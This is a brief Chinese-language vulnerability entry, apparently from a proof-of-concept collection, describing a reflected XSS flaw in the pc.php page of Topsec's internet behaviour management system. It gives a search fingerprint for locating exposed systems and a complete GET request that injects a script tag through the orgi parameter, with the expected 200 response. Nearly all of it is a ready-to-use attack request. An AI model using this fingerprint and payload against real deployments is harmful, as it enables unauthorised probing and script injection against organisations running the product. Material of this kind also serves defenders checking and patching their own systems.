# 天融信上网行为管理系统pc.php存在xss漏漏洞

天融信上网行为管理系统 ｜ XSS ｜ —
- **指纹**：`body="ActiveXObject"`
- **请求**：`GET /smsauth/adverdeclare/pc.php?orgi=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1`
- **响应特征**：200